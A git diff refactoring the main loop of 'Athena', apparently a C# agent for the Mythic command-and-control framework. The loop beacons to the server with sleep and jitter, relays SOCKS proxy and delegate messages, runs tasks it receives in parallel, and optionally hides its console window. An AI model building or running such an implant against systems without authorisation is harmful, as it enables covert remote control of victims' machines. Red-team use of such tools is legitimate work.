@@ -1,11 +1,9 @@
 ﻿using Athena.Commands;
 using Athena.Utilities;
 using System.Collections.Generic;
-using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using System;
-using System.Linq;
 using Athena.Models.Mythic.Checkin;
 using Athena.Models.Mythic.Tasks;
 using Athena.Models.Mythic.Response;
@@ -15,6 +13,8 @@ namespace Athena
 
     class Program
     {
+
+
 #if FORCE_HIDE_WINDOW
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
@@ -32,10 +32,15 @@ namespace Athena
             //Hide Console Window
             ShowWindow(GetConsoleWindow(), 0);
 #endif
-            AsyncMain(args).GetAwaiter().GetResult();
-
+            AsyncMain().GetAwaiter().GetResult();
         }
-        static async Task AsyncMain(string[] args) 
+        
+        /// <summary>
+        /// Main Loop (Async)
+        /// </summary>
+        /// <param name="args"></param>
+        /// <returns></returns>
+        static async Task AsyncMain() 
         { 
             int maxMissedCheckins = 10;
             int missedCheckins = 0;
@@ -60,28 +65,38 @@ namespace Athena
             {
                 try
                 {
-                    List<MythicJob> hasoutput = Globals.jobs.Values.Where(c => c.hasoutput).ToList();
-                    List<DelegateMessage> delegateMessages = Globals.mc.MythicConfig.forwarder.GetMessages();
-                    List<SocksMessage> socksMessages = Globals.socksHandler.GetMessages();
-                    bool success = await checkAgentTasks(hasoutput, delegateMessages, socksMessages);
+                    var delegateTask = Globals.mc.MythicConfig.forwarder.GetMessages();
+                    var socksTask = Globals.socksHandler.GetMessages();
+                    var responsesTask = Globals.mc.commandHandler.GetResponses();
 
-                    if (!success)
+                    await Task.WhenAll(delegateTask, socksTask, responsesTask);
+
+                    List<DelegateMessage> delegateMessages = delegateTask.Result;
+                    List<SocksMessage> socksMessages = socksTask.Result;
+                    List<object> responses = responsesTask.Result;
+
+
+                    List<MythicTask> tasks = await Globals.mc.GetTasks(responses, delegateMessages, socksMessages);
+
+                    if(tasks is null)
                     {
                         if (missedCheckins == maxMissedCheckins)
                         {
                             Environment.Exit(0);
                         }
-                        foreach (var job in hasoutput)
-                        {
-                            Globals.jobs.Add(job.task.id, job);
-                        }
+
+                        //Return responses to waiting queue
+                        await Globals.mc.commandHandler.AddResponse(responses);
+
                         missedCheckins++;
                     }
                     else
                     {
-                        missedCheckins = 0;
-                        await startAgentJobs();
-                        await clearAgentTasks(hasoutput);
+                        Parallel.ForEach(tasks, async c =>
+                        {
+                            Task.Run(() => Globals.mc.commandHandler.StartJob(c));
+                        });
+
                     }
                 }
                 catch (Exception e)
@@ -92,7 +107,7 @@ namespace Athena
                         Environment.Exit(0);
                     }
                 }
-                await Task.Delay(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
+                await Task.Delay(await Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
             }
         }
 
@@ -127,7 +142,7 @@ namespace Athena
                 {
                 }
                 //Sleep before attempting checkin again
-                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
+                Thread.Sleep(await Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
             }
             return res;
         }
@@ -160,100 +175,5 @@ namespace Athena
             }
         }
 
-        /// <summary>
-        /// Perform a check-in with the Mythic server to return current responses and check for new tasks
-        /// </summary>
-        /// <param name="jobs">List of MythicJobs</param>
-        /// <param name="delegateMessages">List of DelegateMessages</param>
-        /// <param name="socksMessage">List of SocksMessages</param>
-        private static async Task<bool> checkAgentTasks(List<MythicJob> jobs, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
-        {
-            List<MythicTask> tasks;
-            try
-            {
-                tasks = await Globals.mc.GetTasks(jobs,delegateMessages,socksMessage);
-            }
-            catch (Exception e)
-            {
-                return false;
-            }
-
-            if (tasks is not null)
-            {
-                foreach (var task in tasks)
-                {
-                    Globals.jobs.Add(task.id, new MythicJob(task));
-                }
-                return true;
-            }
-            else
-            {
-                return false;
-            }
-        }
-
-        /// <summary>
-        /// Kick off jobs received from the Mythic server
-        /// </summary>
-        private static async Task<bool> startAgentJobs()
-        {
-            try
-            {
-                Parallel.ForEach(Globals.jobs, async job =>
-                {
-                    try
-                    {
-                        job.Value.started = true;
-                        await CommandHandler.StartJob(job.Value);
-                    }
-                    catch (Exception e)
-                    {
-                        job.Value.complete = true;
-                        job.Value.hasoutput = true;
-                        job.Value.taskresult = e.Message;
-                        job.Value.errored = true;
-                    }
-                });
-                return true;
-            }
-            catch (Exception e)
-            {
-                return false;
-            }
-        }
-
-        /// <summary>
-        /// Initialize TCP client with a given server IP address and port number
-        /// </summary>
-        /// <param name="jobs">List of MythicJobs</param>
-        private static async Task clearAgentTasks(List<MythicJob> jobs)
-        {
-            foreach (var job in jobs)
-            {
-                try
-                {
-                    //Check if it's a download or upload job
-                    if (!Globals.downloadJobs.ContainsKey(job.task.id) && !Globals.uploadJobs.ContainsKey(job.task.id))
-                    {
-                        if (job.complete)
-                        {
-                            Globals.jobs.Remove(job.task.id);
-                        }
-                        else
-                        {
-                            string sent = Globals.jobs[job.task.id].taskresult;
-                            if (!String.IsNullOrEmpty(Globals.jobs[job.task.id].taskresult))
-                            {
-                                //Hopefully this fixes the issue with missing text being returned to the server.
-                                Globals.jobs[job.task.id].taskresult = Globals.jobs[job.task.id].taskresult.Replace(sent, "");
-                            }
-                        }
-                    }
-                }
-                catch (Exception e)
-                {
-                }
-            }
-        }
     }
 }
